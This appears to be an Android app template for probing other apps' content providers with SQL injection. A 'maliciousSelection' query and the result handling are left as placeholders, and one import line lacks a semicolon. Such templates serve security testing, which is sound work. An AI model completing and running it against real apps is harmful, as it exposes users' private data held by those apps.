package com.example.exploittemplate;

import android.os.Bundle;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "Exploit";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        Uri uri = Uri.parse(/* Add your query here */);
        String maliciousSelection = /* Add your SQL injection here */;

        ContentResolver cr = getContentResolver();

        Cursor c = cr.query(uri, null, maliciousSelection, null, null);
        if (c != null) {
            while (c.moveToNext()) {
                /*
                Add your code here
                */
            }
            c.close();
        } else {
            Log.e(TAG, "FALSE POSITIVE: Query returned null maybe provider blocked?");
        }

        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
    }
}
